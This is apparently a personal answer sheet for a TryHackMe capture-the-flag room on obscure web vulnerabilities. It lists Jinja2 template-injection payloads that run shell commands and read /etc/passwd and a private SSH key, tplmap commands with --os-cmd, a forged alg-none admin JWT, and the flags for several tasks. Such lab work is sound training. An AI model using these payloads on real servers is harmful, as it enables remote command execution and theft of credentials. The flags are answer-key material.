# TryHackMe ZTH: Obscure Web Vulns

> Saikat Karmakar | Jul 31 : 2021

---


## Task 4

1. How would a hacker(you :) ) cat out /etc/passwd on the server(using cat with the rce payload)
```
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```
2. What about reading in the contents of the user test's private ssh key.(use the read file one not the rce one)
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/home/test/.ssh/id_rsa).read()}} 
```

## Task 5

1. How would I cat out /etc/passwd using tplmap on the ip:port combo 10.10.10.10:5000, with the vulnerable param "noot".
```
tplmap.py -u http://10.10.10.10:5000/ -d "noot" --os-cmd "cat /etc/passwd"
```

## Task 6

1. What is the flag?
- with tplmap
```py
tplmap.py -u http://10.10.253.34/ -d "name" --os-cmd "cat /flag"
```
- manually
```py
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```
```
cooctus 
```


## Task 9
1. What parameter allows us to generate a POC(actual exploit)
```
--malicious
```

## Task 14

1. What is the flag?
```
nootnootisthebestflag
```

## Task 18

1. What is the flag?
```
supernootnoot // eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjI3ODgyMDQ2Mzg5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkyLjAuNDUxNS4xMTUgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYyNzg4MjA0Nn0.
```

## Task 22

1. How many users are on the system?
```
31
```
2. What is the name of the user with a UID of 1000?
```
para
```

## Task 25

1. What is the secret?
```
pass
```


